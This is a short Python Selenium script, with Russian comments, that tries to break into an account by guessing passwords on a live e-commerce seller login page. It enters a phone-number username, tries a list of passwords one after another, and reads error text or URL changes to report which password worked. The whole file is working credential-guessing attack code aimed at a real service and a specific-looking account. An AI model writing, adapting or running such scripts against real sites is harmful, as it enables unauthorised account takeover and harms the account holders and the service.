from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import NoSuchElementException, TimeoutException
import time

chrome_options = Options()
# chrome_options.add_argument("--headless")  # если нужно без окна браузера

service = Service()  # либо путь к chromedriver.exe
driver = webdriver.Chrome(service=service, options=chrome_options)

url_login = 'https://seller.uzum.uz/seller/signin'
username = '998884987909'  # твой логин
password_list = ['1234567', 'password123', 'admin12345', 'mirja666u666']  # список паролей

driver.get(url_login)
time.sleep(3)  # ждем загрузки страницы

for password in password_list:
    print(f'Попытка с паролем: {password}')

    # Ввод логина
    login_input = driver.find_element(By.CSS_SELECTOR, 'input[data-test-id="input__login"]')
    login_input.clear()
    login_input.send_keys(username)

    # Ввод пароля
    password_input = driver.find_element(By.CSS_SELECTOR, 'input[data-test-id="input__password"]')
    password_input.clear()
    password_input.send_keys(password)

    # Нажатие кнопки "Войти"
    login_button = driver.find_element(By.CSS_SELECTOR, 'button[data-test-id="button__next"]')
    login_button.click()

    # Ждем некоторое время, даем странице загрузиться
    time.sleep(7)

    # Проверяем, есть ли текст ошибки
    try:
        error_element = driver.find_element(By.XPATH, "//*[contains(text(), 'неправильный')]")
        print(f'[-] Пароль "{password}" неправильный, пробуем следующий...')
        driver.get(url_login)
        time.sleep(3)
        continue
    except NoSuchElementException:
        # Ошибки нет — проверяем URL
        current_url = driver.current_url
        if current_url == url_login or current_url.startswith(url_login):
            # Мы остались или вернулись на страницу входа — значит вход неудачный
            print(f'[-] Пароль "{password}" НЕ правильный (вернулись на страницу входа), пробуем следующий...')
            driver.get(url_login)
            time.sleep(3)
            continue
        else:
            # URL поменялся — скорее всего вход успешен
            print(f'[УСПЕХ] Пароль найден: {password}')
            break
else:
    print('[-] Пароль не найден в списке.')

driver.quit()
